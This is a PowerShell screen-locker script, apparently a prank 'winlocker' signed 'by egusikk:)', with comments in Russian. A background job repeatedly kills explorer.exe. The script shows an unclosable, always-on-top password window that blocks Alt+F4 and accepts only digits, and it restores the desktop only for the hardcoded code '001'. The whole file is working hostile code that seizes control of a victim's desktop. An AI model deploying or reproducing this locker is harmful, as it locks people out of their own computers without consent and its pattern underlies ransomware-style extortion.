Add-Type -AssemblyName PresentationFramework
[void][System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")

$global:Unlocked = $false

# Фоновый поток для принудительного закрытия Explorer
$BlockExplorerJob = {
    while ($true) {
        $explorer = Get-Process -Name "explorer" -ErrorAction SilentlyContinue
        if ($explorer) {
            Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
        }
        Start-Sleep -Milliseconds 300
    }
}
$job = Start-Job -ScriptBlock $BlockExplorerJob

function Show-PasswordWindow {
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "by egusikk:)"
    $form.Size = New-Object System.Drawing.Size(350, 180)
    $form.StartPosition = "CenterScreen"
    $form.FormBorderStyle = "FixedDialog"
    $form.MaximizeBox = $false
    $form.MinimizeBox = $false
    $form.TopMost = $true 

    # Отключаем реакцию формы на любые клики мыши за пределами элементов управления
    $form.Capture = $true

    $label = New-Object System.Windows.Forms.Label
    $label.Location = New-Object System.Drawing.Point(20, 20)
    $label.Size = New-Object System.Drawing.Size(310, 20)
    $label.Text = "enter pass for unlock:"
    $form.Controls.Add($label)

    $textBox = New-Object System.Windows.Forms.TextBox
    $textBox.Location = New-Object System.Drawing.Point(20, 50)
    $textBox.Size = New-Object System.Drawing.Size(290, 20)
    $textBox.PasswordChar = "*" 
    $form.Controls.Add($textBox)

    $button = New-Object System.Windows.Forms.Button
    $button.Location = New-Object System.Drawing.Point(120, 90)
    $button.Size = New-Object System.Drawing.Size(100, 30)
    $button.Text = "Unlock"
    $form.Controls.Add($button)

    # Делаем кнопку Unlock кнопкой по умолчанию для клавиши Enter на форме
    $form.AcceptButton = $button

    # Логика проверки пароля
    $UnlockAction = {
        if ($textBox.Text -eq "001") {
            $global:Unlocked = $true
            $form.DialogResult = [System.Windows.Forms.DialogResult]::OK
            $form.Close()
        } else {
            [System.Windows.Forms.MessageBox]::Show("Incorrect password!", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
            $textBox.Clear()
            $textBox.Focus()
        }
    }

    # Клик по кнопке вызывает проверку
    $button.Add_Click($UnlockAction)

    # БЛОКИРОВКА КЛАВИАТУРЫ: Разрешаем вводить только цифры и обрабатывать Enter
    $textBox.Add_KeyPress({
        param($_, $e)
        # Получаем ASCII код нажатой клавиши
        $char = $e.KeyChar
        
        # Разрешаем: Цифры (от '0' до '9') и Enter (код 13)
        # Если это не они — отменяем ввод (Handled = $true)
        if (-not (($char -ge '0' -and $char -le '9') -or $char -eq [char]13)) {
            $e.Handled = $true
        }
    })

    # Дополнительный перехват клавиши Enter непосредственно внутри текстового поля
    $textBox.Add_KeyDown({
        param($_, $e)
        if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Enter) {
            & $UnlockAction
            $e.Handled = $true
            $e.SuppressKeyPress = $true
        }
    })

    # Запрещаем закрывать форму через Alt+F4 или крестик
    $form.Add_FormClosing({
        param($_, $e)
        if ($global:Unlocked -eq $false) {
            $e.Cancel = $true
        }
    })

    # Автофокус на поле ввода при открытии, чтобы пользователю не нужно было кликать мышкой
    $form.Add_Shown({ $textBox.Focus() })

    $form.ShowDialog() | Out-Null
}

Show-PasswordWindow

if ($global:Unlocked -eq $true) {
    Stop-Job $job
    Remove-Job $job
    Start-Process "explorer.exe"
}
